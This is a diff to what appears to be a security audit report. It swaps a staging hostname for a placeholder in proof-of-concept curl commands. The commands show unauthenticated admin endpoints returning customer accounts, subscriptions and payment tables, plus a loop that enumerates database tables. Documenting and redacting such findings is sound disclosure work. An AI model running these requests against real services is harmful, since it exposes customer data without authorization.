@@ -127,9 +127,9 @@ The generic admin endpoints in `/admin.py` lines 170-262 completely bypass authe
 #### Proof of Concept
 ```bash
 # No authentication required - returns sensitive customer data
-curl "https://api.staging.mindroom.chat/admin/accounts"
-curl "https://api.staging.mindroom.chat/admin/instances"
-curl "https://api.staging.mindroom.chat/admin/subscriptions"
+curl "https://api.<superdomain>/admin/accounts"
+curl "https://api.<superdomain>/admin/instances"
+curl "https://api.<superdomain>/admin/subscriptions"
 ```
 
 #### Data Exposed
@@ -188,7 +188,7 @@ Attackers can enumerate all database tables by accessing `/admin/{table_name}` e
 ```bash
 # Enumerate tables and access data
 for table in accounts instances subscriptions payments audit_logs; do
-    curl "https://api.staging.mindroom.chat/admin/$table"
+    curl "https://api.<superdomain>/admin/$table"
 done
 ```
 
